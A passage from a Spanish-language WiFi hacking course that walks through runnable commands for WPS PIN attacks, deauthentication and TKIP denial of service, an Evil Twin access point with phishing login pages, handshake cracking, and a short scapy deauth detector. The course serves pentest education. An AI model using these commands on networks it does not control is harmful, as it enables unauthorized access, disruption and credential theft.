<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course9.png">

Si revisamos la columna que dice **WPS**, vemos que algunos puntos de acceso no lo tienen (deshabilitado), por lo que no serviría de nada intentarlo. Otros tienen **2.0** que también es seguro, puesto que es la versión moderna, y otro AP tiene **1.0** por lo que es potencialmente vulnerable, así que vamos a ver cómo explotarlo

> Comando para realizar el ataque
```sh
reaver -i wlan0mon -c <canal> -b <bssid> -vv -K
```

El parámetro **”-K”** se añade para realizar el ataque **Pixie Dust**, deberías ver algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course19.png">

En mi caso el ataque no logró conseguir el **PIN valido** para posteriormente conseguir la contraseña, pero siempre que veas un AP con el **WPS** en la versión **1.0** deberías probar este ataque

Si quieres aprender más acerca de **WPS** y porque es posible este ataque te recomiendo ver este [post](https://kalitut.com/wifi-attack-with-wps-using-reaver/) donde esta muy bien explicado todo

## Ataque Null Pin

Este ataque es ciertamente raro y gracioso… básicamente algunos modelos de ciertos routers permiten conectarse usando un **PIN vacío**, hasta donde yo se, este ataque puede ocurrir en cualquiera de las dos versiones de **WPS** ya que es un fallo de implementación (bastante extraño) pero no de la propia seguridad del protocolo. No hay mucho más que decir sobre este ataque así que pasamos directamente a la explotación

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/null-pin.png">

Una vez elegido el AP al que lanzar el ataque (con **WPS** activado) hacemos lo siguiente:

> Usamos **reaver** para probar un pin vacío
```sh
reaver -i wlan0mon -b <bssid> -p “” -N
```

Como es normal no tengo ningún router vulnerable a este ataque, ni he conseguido explotarlo en otros APs, pero es bueno conocer todos los ataques, y por si acaso he decidido explicarlo. Aun asi, por aqui puedes ver cómo sería si el ataque funcionase

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course20.png">

Por si quieres ver un poco mas de informacion del ataque por aqui te dejo este [post](https://rafalharazinski.gitbook.io/security/personal-projects/wifi-penetration-testing/wps-attack-null-pin)

## Ataque Michael Shutdown Exploitation

La verdad que este ataque es difícil explicarlo porque tampoco hay mucha información al respecto, literalmente la descripción del ataque es **“Sends random packets or re-injects duplicates on another QoS queue to provoke Michael Countermeasures on TKIP APs. AP will then shutdown for a whole minute, making this an effective DoS”**, como veis no detalla prácticamente nada pero os puedo asegurar que no suele ser tan efectivo como dice, ya que solo funciona en los puntos de acceso **TKIP** (también es antiguo). A pesar de todo es interesante conocer el ataque para poder comprobar la seguridad de un AP. Usaremos **mdk4** para este ataque

```sh
mdk4 wlan0mon m -t <bssid> -w 2 -w 1 -n 200 -s 1000
```

Aunque no se si sera efectivo al 100% deberias ver algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course21.png">

Como ya os comente, no hay casi informacion de este ataque por lo que no he podido comprobar si realmente funciona contra APs que usen **TKIP**. Aun asi te recomiendo leer la historia de **Michael Calce**, y lo que hizo [aqui](https://hipertextual.com/2021/12/primer-ataque-ddos-internet-mafiaboy)

## Ataque Evil Twin

Bueno pasemos al siguiente ataque, el **Evil Twin**, este es mi favorito y podríamos decir que es como usar el *”comodin”* dentro del hacking wifi ya que no se basa en enviar paquetes especiales ni en interceptar paquetes que el router tramita. El propósito del ataque es poder obtener credenciales ya sea del AP de la víctima o de cualquier otro servicio mediante la creación de un AP falso que requiere authenticacion (un panel de login) al conectarse por lo que el atacante puede usar la **ingeniería social** para robar credenciales. Como ves este ataque no tiene una explicación técnica muy detallada, por aquí os dejo una explicación gráfica

Lo malo de este ataque es que es más complejo de hacer manualmente por lo que siempre que quieras ejecutar este ataque te recomiendo usar una herramienta automatizada como [WEF](https://github.com/D3Ext/WEF), aun asi para esta ocasion mostrare como hacerlo a mano. Usaremos **hostapd** y **dnsmasq** para desplegar el AP, para enrutar la conexión y hacer que al conectarse a la red salga un panel de login. Para esto, necesitaremos un archivo de configuración para cada herramienta. Quizas tengas algun error durante la creacion del ataque pero en [Errores Comunes](#errores-comunes) tienes algunos errores comunes que me han ocurrido a mi también (el ataque esta probado en conexion ethernet)

Creamos el archivo de configuración de **hostapd**

> hostapd.conf
```sh
interface=wlan0mon
ssid=Free-Wifi # Cambia el nombre del AP generado
hw_mode=g
channel=6 # Canal del AP
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
ieee80211n=1
wme_enabled=1
driver=nl80211
```

Creamos el archivo de configuración de **dnsmasq**

> dnsmasq.conf
```sh
interface=wlan0mon
dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
dhcp-option=3,10.0.221.1
dhcp-option=6,10.0.221.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=10.0.221.1
address=/#/10.0.221.1
```

Empezamos desplegando el AP

> Usamos la configuración de **hostapd**
```sh
hostapd hostapd.conf
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course22.png">

Ponemos la interfaz que está en modo monitor, en el segmento creado para enrutar la conexión:

```sh
ifconfig wlan0mon 10.0.221.1 netmask 255.255.255.0
route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1
```

> Activamos **dnsmasq** con el archivo de configuración
```sh
dnsmasq -C dnsmasq.conf -d
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course23.png">

En otra terminal ejecutamos:

> Configuración de **iptables**, cambia **eth0** por tu interfaz de red donde tengas internet
```sh
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -A FORWARD -i eth0 -o wlan0mon -m state --state RELATED,ESTABLISHED -j ACCEPT
iptables -A FORWARD -i wlan0mon -o eth0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course24.png">

En mi caso me dio un error pero no te preocupes porque no deberia cambiar nada

En este punto solo queda arrancar un servicio **http** en el puerto **80** para que en el momento en el que alguien se conecte al AP le pida authenticarse en el panel. Si quieres alguna plantilla con el login de alguna red social o algún otro servicio te recomiendo las plantillas que tengo [aquí](https://github.com/D3Ext/WEF/tree/main/templates), para usarlas solo haría falta entrar a la carpeta que hayamos elegido y ejecutar lo siguiente:

```sh
php -S 10.0.221.1:80
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course25.png">

Si todo ha ido según lo esperado, si pruebas a ver las wifis cercanas desde el móvil deberías poder ver un nuevo AP que se llama como lo has especificado en el archivo **hostapd.conf** y si pruebas a conectarte debería llevarte automáticamente a el panel de login que has elegido.

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course26.jpg" width="350" height="700">

Con este ataque quizás no obtengas acceso a ningún AP pero puede ser una muy buena opción de cara a una auditoría wifi para ver si los clientes caen en la trampa e introducen sus credenciales.

## Uso de la herramienta WEF

Me alegra poder hacer un curso de hacking wifi y poder usar mi propia herramienta para realizar los ataques y demás funciones, actualmente cuenta con todos los ataques mostrados hasta ahora, aunque tengo pensado añadir otros ataques 

Si quieres, puedes echarle un ojo [aquí](https://github.com/D3Ext/WEF) donde explico como instalarla y sus funciones

Para usar la herramienta solo hace falta tener la antena conectada y sin tener la interfaz en modo monitor (todo se hace de forma interactiva y automática desde la propia herramienta) solo haría falta ejecutar lo siguiente:

```sh
wef -i wlan0
```

Una vez dentro puedes ver las diferentes funciones, no hace falta poner el número de cada función, si lo prefieres puedes poner el nombre de la función (está implementado para que funcione con palabras, por ejemplo: deauthentication). También recordar que podéis poner **”help”** para ver un panel de ayuda

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course27.png">

Antes de realizar cualquier ataque debes seleccionar la opción de iniciar el modo monitor, aunque en caso de olvidarte, WEF te avisa y no hace el ataque. Tras iniciar la interfaz en modo monitor deberias ver que la informacion de la antena ha cambiado y esta en color verde (activo) ya que esta en modo monitor

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course28.png">

Si no quieres atacar aún, sino que quieres ver que APs hay cerca para posteriormente elegir el ataque, puedes poner **“scan”** y se encarga de listar todas los APs

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course29.png">

Ahora elegimos el ataque que queramos, en mi caso para la demostracion elegire el **PMKID Attack**, al seleccionar el ataque deberias ver algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course30.png">

Al seleccionar cada ataque, empezara a escanear redes durante un tiempo suficiente y luego podrás seleccionar la red a la que quieres atacar, todo de forma intuitiva y generando pequeños logs que podrás revisar en la ruta **/opt/wef/main/logs/** además la herramienta permite comprobar si al finalizar un ataque has capturado algun handshake y crackearlos de forma automática. También permite desplegar un AP falso (Evil Twin attack) de forma sencilla y efectiva con múltiples opciones para ajustarlo a nuestras necesidades entre otras muchas mas funciones.

Ten en cuenta que por defecto el **verbose** esta desactivado para que el usuario haga todos los ataques de forma simple y sin pensar mucho. Si quieres activarlo para ver como se ejecuta el ataque, puedes poner **"verbose"** para activarlo y **"no verbose"** para desactivarlo de nuevo

Si tienes alguna sugerencia o error abre un issue en el [repositorio oficial](https://github.com/D3Ext/WEF) de GitHub

## Cómo detectar un ataque de deauthenticacion

Actualmente es fácil detectar un ataque de deauthenticacion e incluso se puede programar en unas pocas líneas de python, para eso usaremos la librería **scapy.all**

Solamente hace falta activar la antena en modo monitor y con un simple código como este:

```python
#!/usr/bin/env python3

from scapy.all import *

def PacketHandler(pkt):         
        if pkt.haslayer(Dot11) and pkt.type == 0 and pkt.subtype == 0xC:
            print("Deauth packet sniffed: %s" % (pkt.summary()))

sniff(iface="wlan0mon", prn = PacketHandler)
```

En tu caso cambia **wlan0mon** al nombre de tu interfaz. Ahora solo queda ejecutar el script e inyectar paquetes de deauthenticacion como ya expliqué antes (con **aireplay-ng**), para comprobar si el detector funciona correctamente. Deberías poder ver cómo detecta los paquetes sin problemas. 

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course31.png">

Por lo que para crear algún proyecto enfocado a defensa de redes puede ser muy buena idea. Además sería fácil implementar más funciones para que detecte y clasifique los tipos de paquetes wifi detectados y luego representarlos en una web con **Flask** o algo por el estilo

Si quieres ver los valores de los diferentes tipos de paquetes wifi para poder detectar otros ataques o lo que quieras te recomiendo aprender [aquí](https://howiwifi.com/2020/07/13/802-11-frame-types-and-formats/), tienen un buen post con mucha informacion

## Descubrir redes ocultas

Seguro que alguna vez te has preguntado qué ocurre con las redes ocultas, pues no hay una forma precisa al 100% para descubrir el nombre de las redes pero sí que se puede hacer.

Probablemente si has usado **airodump-ng** antes o si con suerte has estado cerca de alguna red oculta habrás notado que en algunos nombres pone **“<lenght: 0>”** pues eso es una red oculta. En este caso voy a explicar dos formas diferentes de encontrar el nombre real, la primera con **mdk4** y la segunda (la más efectiva) con **aireplay-ng**

Empecemos por **mdk4**, en este caso se trata de emitir **“Probe requests”** (explicado en [Teoria Wifi](#teoria-wifi)) haciendo una especie de fuerza bruta del nombre del punto de acceso para ver si es válido y el nombre coincide. Te recomiendo este [diccionario](https://gist.github.com/jgamblin/da795e571fb5f91f9e86a27f2c2f626f) con nombres comunes de APs para hacer lo siguiente:

```sh
mdk4 wlan0mon p -t <bssid> -f commonssids.txt
```

En este punto la herramienta debería empezar a probar todos los nombres, pero no lo he podido comprobar yo mismo porque no tengo ninguna red oculta cercana

Esta forma no es la más óptima de descubrir el nombre ya que probablemente el nombre no aparezca en el diccionario, así que pasemos al siguiente método.

Con **aireplay-ng** es más preciso ya que se basa en permanecer capturando los paquetes mientras que haces un ataque de deauthenticacion como ya enseñé previamente para obtener el handshake y más información del AP, el único inconveniente es que tiene que haber clientes conectados a la red. El procedimiento seria usar **airodump-ng** en el canal de la red oculta para obtener cualquier handshake o información (**airodump-ng wlan0mon -c \<numero\>**) y mientras tanto en otra terminal ejecuta:

```sh
aireplay-ng -0 6 -b <bssid> wlan0mon
```

Al acabar de enviar los paquetes, los clientes se reconectan al AP y se genera el handshake por lo que si ahora vas a ver el escaneo de **airodump-ng** que dejastes corriendo, deberías ver que el nombre ha cambiado y puedes ver el nombre real

## Extra

En esta sección voy a enseñaros trucos y funciones que no son necesarias al 100% pero que vienen muy bien y son interesantes.

### Wardriving

**¿Que es el wardriving?**, pues es una tecnica en la que el atacante usa su antena, un **GPS** y un vehiculo (preferiblemente un coche) para poder localizar de forma precisa en el mapa las redes existentes y su informacion. Se puede hacer de forma personal escaneando los APs como ya enseñe o tambien se puede hacer con la aplicacion **[WiGLE](https://wigle.net/)** la cual esta disponible para moviles y donde tambien otros usuarios suben sus escaneos a modo de ***base de datos comunitaria*** con las diferentes redes localizadas en el mapa

### Crear gráficos de escaneos wifi

¿Te gustaría poder ver las diferentes redes escaneadas con sus clientes asociados todo en una imagen con colores y bien representado?, pues si, es algo que se puede hacer simplemente con otra utilidad de la suite de aircrack-ng llamada **airgraph-ng**

Obviamente para conseguir la foto en estilo gráfico hay que haber escaneado las redes antes con **airodump-ng** y exportar la info a un archivo, ya lo he enseñado en la sección de "**[Capturar información Wifi](#capturar-información-wifi)**" pero lo vuelvo a repetir para que así os acostumbreis a la sintaxis de los comandos e interioriceis los conceptos, asique hacemos:

```sh
airodump-ng wlan0mon -w captura
```

Cuando queramos cancelamos el escaneo pulsando **Ctrl + C** y ya tenemos la información exportada en **formato CSV** asique podemos crear el gráfico sin problema de esta forma:

> Comando para crear el gráfico
```sh
airgraph-ng -i captura-01.csv -o grafico -g CAPR
```

El comando debería devolver algo como esto:

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course32.png">

Con **”-o”** específicas el nombre que tendrá la imagen, con **”-i”** le especificas el archivo con la información de red en formato **CSV** y con **”-g”** eliges entre los dos tipos de gráfico para generar, este es el mejor pero si quieres puedes probar a poner **”CPG”** en vez de **”CAPR”**

> Como se ve el gráfico
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course-graph.png">

Es algo muy útil por si quieres usar imágenes descriptivas en tus reportes a la hora de realizar una auditoría, en vez de usar simple texto con la información escrita, además los gráficos añaden el fabricante del router y de los clientes de cada AP (TP-Link, Samsung...)

### Crear Rainbow Tables

Como ya hemos visto antes, los handshakes WPA comunes los crackeamos con **aircrack-ng** o con **hashcat** usando un diccionario de contraseñas, pero se puede hacer usando otra alternativa a las contraseñas comunes. Aquí es donde entran en juego las **Rainbow Tables**.

Te preguntarás: **¿Qué son las Rainbow Tables?**, pues para entender cómo funciona debes entender cómo funcionan los proceso de cracking, las herramientas como **hashcat** o **aircrack-ng** siguen los siguientes pasos:

* Obtiene todas las contraseñas del diccionario
* Transforma cada contraseña en el formato del handshake
* Comprueba si los dos handshakes tienen el mismo valor
* Repite los 3 pasos anteriores hasta que la contraseña coincida

Aunque puede parecer que es algo muy rápido realmente es un proceso que hay que hacer en miles de contraseñas por lo que a la larga es mejor tener una buena grafica en el PC para crackear los handshakes con **hashcat**, igualmente esta forma es innovadora. Primero debemos crear la base de datos de las rainbow tables con **airolib-ng**

```sh
airolib-ng rainbow-table --import essid essid.txt
airolib-ng rainbow-table --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng rainbow-table --batch
```

<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-course33.png">

Una vez hecho esto, solo queda usarla para crackear el handshake con **aircrack-ng**:

```sh
aircrack-ng -r rainbow-table handshake
```

Y debería empezar a crackear el handshake muchisimo mas rapido

### Hardware

- **WiFi Coconut**

Ademas de lo que ya he comentado sobre las antenas para hacking wifi existen aparatos para realizar algunas otras funciones o realizarlas de diferentes formas. Como por ejemplo el **WiFi Coconut** de la empresa **Hak5**, el cual permite capturar informacion wifi a la vez en los **14** canales wifi de **2.4 Ghz**.

> WiFi Coconut
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-coconut.webp" height="320" width="400">

- **DSTIKE Deauther Mini**

Si lo que buscas es algo mas pequeño con capacidad para escanear APs, hacer ataques de deauthenticacion y monitorear el trafico de un AP tambien tienes muchos de los productos de **DSTIKE**, como el **[DSTIKE Deauther Mini](https://dstike.com/collections/frontpage/products/dstike-wifi-deauther-mini)**, el cual esta construido a partir de una placa de desarrollo ESP8266 (para conexiones wifi) y funciona con tan solo conectarlo a una fuente de energia y viene con una pantalla y una pequeña rueda para seleccionar las diferentes funciones

> DSTIKE Deauther Mini
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/deauther-mini.jpg">

- **WiFi Pinneapple**

Tambien esta la **WiFi Pinneapple** de **Hak5**, que permite desplegar puntos de acceso falsos con muchas otras funciones e interfaz web, aunque los productos de **Hak5** son bastante caros suelen ser muy potentes y merece la pena

> WiFi Pinneapple
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/wifi-pinneapple.jpg">

- **Raspberry Pi**

Otra herramienta que te puede ser util es una **Raspberry Pi**, aunque no esta orientada para pentesting o hacking wifi es muy util para desplegar los ataques ya que es muy compacta y tiene buenas caracteristicas en cuanto a hardware y la recomiendo sin duda ya que la puedes usar para muchisimas otras cosas

> Raspberry Pi
<img src="https://raw.githubusercontent.com/D3Ext/d3ext.github.io/gh-pages/images/wifi/raspberry_pi.jpg">

### Herramientas automatizadas

Además de las herramientas base para hacer los ataques manualmente como **aireplay-ng**, **mdk4** o **airodump-ng** existen herramientas creadas para hacer los ataques de forma totalmente automatizada y para que cualquiera las use sin tener ningún conocimiento, a pesar de que un ataque manual siempre será mejor porque tienes el control al 100% de lo que ocurre y como ocurre, por aquí os dejo una lista de buenas herramientas que quizás os interesen:

* [WEF](https://github.com/D3Ext/WEF) creado por mi
* [wifite2](https://github.com/derv82/wifite2) creado por **derv82**
* [airgeddon](https://github.com/v1s1t0r1sh3r3/airgeddon) creador por **v1s1t0r1sh3r3**
* [wifiphisher](https://github.com/wifiphisher/wifiphisher)
* [eaphammer](https://github.com/s0lst1c3/eaphammer) creado por **s0lst1c3**
* [Kismet](https://www.kismetwireless.net/docs/readme/quickstart/)

### Otros ataques secundarios

Ademas de los ataques que ya he mostrado, aun hay mas, pero no los voy a explicar en detalle porque no suelen ser efectivos o porque simplemente no merece la pena

* El ataque **CTS Frame** se basa en modificar un paquete **CTS** para aumentar su tiempo de duracion y tratar de hacer un *secuestro del ancho de banda* 
* Los ataques **KARMA**, **MANA** y **Loud MANA** se basan en generar un AP para emitir y recibir ciertos **"Probe requests"** y **"Probe responses"** para hacer que clientes externos se conecten al AP falso generado, con el objetivo de capturar credenciales y demas informacion. Este [post](http://seguridadxredes.blogspot.com/2016/02/atacando-8021x-con-mana-toolkit.html) lo explica mejor
* El ataque **Replay** y **Chopchop** tampoco los voy a explicar porque solo afectan al protocolo **WEP** por lo que no es muy util, ya que el protocolo esta obsoleto y tampoco puedo probar su eficacia

## Errores comunes

- Sin conexion internet

Quizas al devolver la interfaz a la normalidad (modo **managed**) puede que sigas sin tener conexion internet, para eso reinicia el servicio **wpa_supplicant** y **NetworkManager**

```sh
systemctl restart wpa_supplicant
systemctl restart NetworkManager
```

Y si despues de esto sigues teniendo el mismo problema ejecuta:

```sh
dhclient
```

En caso de que tampoco funcione esto ultimo, prueba la clasica solucion... reiniciar el sistema, puede que te sirva.

- Dnsmasq no inicia

Quizas al tratar de iniciar **dnsmasq** para el ataque **Evil Twin** te reporte un error y probablemente sea porque tienes el puerto **53** ocupado (el servicio dns) por lo que deberias matarlo por ejemplo de esta forma:

> Uso de **fuser** para desocupar el puerto **53**
```sh
fuser -k 53/tcp
```

Si al tratar de iniciar el servicio web con **php** para el ataque **Evil Twin** te da error, puede ser tambien porque este ocupado el puerto **80**, asique podrias tratar de *"matarlo"* de la misma forma

- Deauthenticacion da error

Quizas al ejecutar el comando, **aireplay-ng** te diga que el AP opera en un canal diferente por lo que para arreglarlo deberias poner manualmente la antena en el mismo canal de la siguiente forma:

```sh
iwconfig wlan0mon channel <numero>
```

*(En esta seccion seguire añadiendo otros errores que me ocurran o recuerde)*

## Cheat sheet de comandos

Estas son las todas herramientas usadas durante las explicaciones:

- **ifconfig**: permite listar las interfaces de red y activarlas/desactivarlas
- **iwconfig**: sirve para listar las interfaces virtuales y su información
- **macchanger**: herramienta para cambiar la dirección MAC de una interfaz
- **airmon-ng**: permite activar/desactivar el modo monitor en la interfaz de tu antena
- **airodump-ng**: sirve para escanear las redes cercanas y los dispositivos asociados a ellas
- **wash**: otra herramienta para escanear redes y detectar si tienen el WPS activado
- **aireplay-ng**: útil para realizar ataques de red, el más útil es el de deauthenticacion
- **aircrack-ng**: herramienta más famosa para crackear los handshakes obtenidos
- **mdk4**: sirve para hacer otros ataques como el **Beacon Flood** o el de **authenticacion** 
- **hashcat**: herramienta para crackear muchos tipos de hashes, entre ellos los handshakes
- **hcxdumptool**: permite escanear redes para capturar handshakes **PMKID**
- **hcxpcapng**: usado para convertir un escaneo de **hcxdumptool** a un formato crackeable
- **reaver**: herramienta para realizar ataques a la implementación WPS
- **hostapd**: permite crear APs usando un archivo de configuracion
- **dnsmasq**: sirve para enrutar la conexión y otros temas de DNS
- **airgraph-ng**: para crear un gráfico (imagen) a partir de la información de un escaneo
- **airolib-ng**: permite crear Rainbow Tables con un diccionario y nombres de redes wifi

Por aquí os dejo algunos comandos comunes junto a su descripción por si en algún momento quieres revisarlos, aunque recomiendo siempre mirar el panel de ayuda de todas las herramientas para conocer mas funciones y aprender tambien por tu cuenta

> Listar todas las interfaces
```sh
ifconfig
```

> Listar interfaces virtuales
```sh
iwconfig
```

> Inicia en modo monitor la interfaz
```sh
airmon-ng start wlan0
```

> Desactiva el modo monitor de la interfaz
```sh
airmon-ng stop wlan0mon
```

> Cambia manualmente el canal en el que opera la interfaz
```sh
ifconfig wlan0mon channel 6
```

> Escaneo simple en todos los canales (**airodump-ng**)
```sh
airodump-ng wlan0mon
```

> Escaneo simple con **wash**
```sh
wash -s -2 -5 -a -i wlan0mon
```

> Crackear WPA handshakes con **aircrack-ng**
```sh
aircrack-ng captura-01.cap -e <essid> -w /usr/share/wordlists/rockyou.txt
```

> Formatear handshakes WPA con **cap2hccapx**
```sh
cap2hccapx captura-01.cap handshake_formateado
```

> Crackear handshakes WPA (formateados previamente con **cap2hccapx**) o PMKID (formateados previamente con **hcxpcapngtool**)
```sh
hashcat -m 22000 hashes /usr/share/wordlists/rockyou.txt
```

> Simple ataque de deauthenticacion
```sh
aireplay-ng -0 10 -e "nombre-de-la-wifi" -c FF:FF:FF:FF:FF:FF wlan0mon
```

> Simple ataque de authenticacion
```sh
mdk4 wlan0mon a -i <bssid> -m
```

> Simple ataque de Beacon Flood
```sh
mdk4 wlan0mon b -c <número-del-canal> -s 2000
```

> Ataque PMKID (obtencion de handshakes)
```sh
hcxdumptool -i wlan0mon -o captura –enable_status=1
```

> Convertir PMKID handshakes a formato crackeable
```sh
hcxpcapngtool -o hashes captura
```

> Crea un grafico a partir de una captura de **airodump-ng**
```sh
airgraph-ng -i captura-01.csv -o grafico.png -g CAPR
```

## Conclusión

Bueno gente pues esto ha sido todo, espero que hayáis aprendido mucho sobre hacking wifi, los diferentes ataques, funciones extra y demás. También deciros que si queréis certificaros con un examen práctico sobre hacking wifi tenéis el **OSWP** de **OffensiveSecurity**, lo malo de el examen es que hasta donde yo sé, se centran demasiado en el protocolo **WEP**, el cual no se usa casi nada actualmente por lo que estaría bien que se enfocasen más en otros ataques actuales (Ademas de que es un examen bastante caro). Si tenéis alguna sugerencia o crees que me ha faltado algo por explicar me podéis contactar sin problema.

**¡Hasta la próxima!**

[Volver arriba](#)

*Si crees que el curso ha merecido la pena, agradeceria que me apoyases :D*

[!["Buy Me A Coffee"](https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png)](https://www.buymeacoffee.com/d3ext)


